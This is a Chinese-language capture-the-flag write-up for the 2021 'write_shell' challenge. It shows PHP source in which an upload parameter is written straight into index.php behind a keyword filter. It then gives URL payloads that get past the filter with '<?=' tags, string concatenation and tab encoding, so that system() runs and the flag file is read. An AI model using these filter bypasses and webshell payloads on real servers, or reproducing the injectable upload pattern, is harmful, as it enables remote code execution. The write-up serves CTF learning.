# [红明谷CTF 2021]write_shell

## 知识点

`php代码审计`

`命令执行绕过`

## 解题

题目源码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

过滤了`php`,`空格`，写入文件内容时可以用`<?=`绕过`<?php`，里面的内容可以用`.`绕过，如`ph.pinfo`,，`;`被过滤掉了,只执行一条语句即可,`空格`可以用`%09`(tab)绕过

```url
/?action=upload&data=<?=(ph.pinfo)()?>
```

![Alt text](G:/CTFWriteUp/buuctf/Web/img/19-1.png)

![Alt text](G:/CTFWriteUp/buuctf/Web/img/19-2.png)

```url
?action=upload&data=<?=system("ls%09/")?>
或者
/?action=upload&data=`cat%09/flllllll1112222222lag`?>
```

![Alt text](G:/CTFWriteUp/buuctf/Web/img/19-3.png)

```url
?action=upload&data=<?=system("cat%09/flllllll1112222222lag")?>
```

![Alt text](G:/CTFWriteUp/buuctf/Web/img/19-4.png)

[参考文章](https://www.shawroot.cc/1897.html)